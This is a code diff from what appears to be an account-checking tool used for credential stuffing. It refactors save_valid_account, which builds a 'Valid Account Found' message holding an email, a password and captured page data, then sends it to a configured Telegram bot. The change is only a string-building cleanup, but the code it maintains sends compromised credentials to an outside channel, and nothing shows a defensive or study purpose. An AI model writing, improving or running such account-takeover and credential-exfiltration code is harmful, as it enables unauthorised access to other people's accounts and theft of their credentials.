@@ -2380,13 +2380,14 @@ def save_valid_account(email, password, results_folder, browser, capture_setting
         bot_token = telegram_settings.get("bot_token")
         chat_id = telegram_settings.get("chat_id")
         if bot_token and chat_id:
-            message = f"✅ Valid Account Found:\nEmail: {email}\nPassword: {password}\n"
+            message_parts = [f"✅ Valid Account Found:\nEmail: {email}\nPassword: {password}\n"]
             for key, value in captured_info.items():
                 if key.lower() in ['inner_html', 'outer_html']:
                     continue  # Exclude large content from Telegram message
                 # Avoid including error messages
                 if value not in ("Not found", "Not captured"):
-                    message += f"{key.capitalize()}: {value}\n"
+                    message_parts.append(f"{key.capitalize()}: {value}\n")
+            message = "".join(message_parts)
             # Ensure message length does not exceed Telegram's limit
             max_length = 4000  # Telegram limit is 4096 characters
             if len(message) > max_length:
